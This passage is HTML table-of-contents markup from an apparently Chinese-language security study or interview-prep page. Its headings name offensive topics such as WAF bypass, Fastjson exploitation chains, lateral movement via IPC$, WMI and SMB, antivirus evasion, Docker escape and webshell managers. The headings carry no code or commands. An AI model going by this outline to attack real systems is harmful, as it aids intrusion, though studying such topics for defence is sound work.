href="#Golang%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-number">79.2.</span> <span class="toc-text">Golang的安全问题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flask-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-number">80.</span> <span class="toc-text">Flask 模板注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IIS%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">81.</span> <span class="toc-text">IIS文件解析漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">82.</span> <span class="toc-text">Apache文件解析漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nginx%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">83.</span> <span class="toc-text">Nginx文件解析漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4"><span class="toc-number">84.</span> <span class="toc-text">nmap常见命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4"><span class="toc-number">85.</span> <span class="toc-text">sqlmap常见命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E4%B8%ADfinal%E5%85%B3%E9%94%AE%E5%AD%97%E7%9A%84%E7%94%A8%E9%80%94"><span class="toc-number">86.</span> <span class="toc-text">Java中final关键字的用途</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E4%B8%ADstatic%E5%85%B3%E9%94%AE%E5%AD%97%E7%9A%84%E7%94%A8%E9%80%94"><span class="toc-number">87.</span> <span class="toc-text">Java中static关键字的用途</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#final%E5%92%8Cstatic%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">88.</span> <span class="toc-text">final和static的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WAF%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">89.</span> <span class="toc-text">WAF绕过方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%91WAF%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">90.</span> <span class="toc-text">云WAF绕过方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8EJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">91.</span> <span class="toc-text">Fastjson反序列化与Java反序列化的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastjson%E9%AB%98%E7%89%88%E6%9C%AC%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95"><span class="toc-number">92.</span> <span class="toc-text">Fastjson高版本攻击方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95"><span class="toc-number">93.</span> <span class="toc-text">Fastjson不出网的攻击方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastjson%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">94.</span> <span class="toc-text">Fastjson常见利用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%A8%AA%E5%90%91%E6%89%8B%E6%AE%B5"><span class="toc-number">95.</span> <span class="toc-text">内网渗透横向手段</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-IPC-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">95.1.</span> <span class="toc-text">1. IPC$横向移动</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-WMI%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">95.2.</span> <span class="toc-text">2. WMI横向移动</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-SMB%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">95.3.</span> <span class="toc-text">3. SMB横向移动</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%8D%E6%9D%80%E7%9B%B8%E5%85%B3%EF%BC%9A%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%98%AF%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%8E%AF%E5%A2%83"><span class="toc-number">96.</span> <span class="toc-text">免杀相关：判断是否是虚拟机环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%91%E5%8E%9F%E7%94%9F%E6%94%BB%E9%98%B2%E6%80%9D%E8%B7%AF%E4%BB%A5%E5%8F%8A%E6%89%8B%E6%AE%B5"><span class="toc-number">97.</span> <span class="toc-text">云原生攻防思路以及手段</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E6%80%9D%E8%B7%AF"><span class="toc-number">97.1.</span> <span class="toc-text">攻防思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5"><span class="toc-number">97.2.</span> <span class="toc-text">常见攻击手段</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker%E9%80%83%E9%80%B8%E7%9A%84%E6%89%8B%E6%AE%B5"><span class="toc-number">98.</span> <span class="toc-text">Docker逃逸的手段</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E"><span class="toc-number">98.1.</span> <span class="toc-text">1. 利用内核漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8Docker%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E"><span class="toc-number">98.2.</span> <span class="toc-text">2. 利用Docker版本漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8CDK%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7"><span class="toc-number">98.3.</span> <span class="toc-text">3. 利用CDK自动化工具</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%88%A9%E7%94%A8%E6%8C%82%E8%BD%BD%E7%82%B9"><span class="toc-number">98.4.</span> <span class="toc-text">4. 利用挂载点</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Struts2-OGNL-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%9A"><span class="toc-number">99.</span> <span class="toc-text">Struts2 OGNL 注入漏洞：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%89%AB%E6%8F%8F%E5%91%BD%E4%BB%A4"><span class="toc-number">100.</span> <span class="toc-text">常见攻击扫描命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB%E6%9C%8D%E5%8A%A1%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E7%B1%BB%E9%97%AE%E9%A2%98"><span class="toc-number">101.</span> <span class="toc-text">SMB服务基础概念类问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E7%B1%BB%E9%97%AE%E9%A2%98"><span class="toc-number">102.</span> <span class="toc-text">SMB服务安全漏洞类问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fofa%E8%AF%AD%E6%B3%95"><span class="toc-number">103.</span> <span class="toc-text">Fofa语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8F%9C%E5%88%80%EF%BC%8C%E8%9A%81%E5%89%91%EF%BC%8C%E5%86%B0%E8%9D%8E%EF%BC%8C%E5%93%A5%E6%96%AF%E6%8B%89"><span class="toc-number">104.</span> <span class="toc-text">菜刀，蚁剑，冰蝎，哥斯拉</span></a></li></ol>
       </div>
     
 
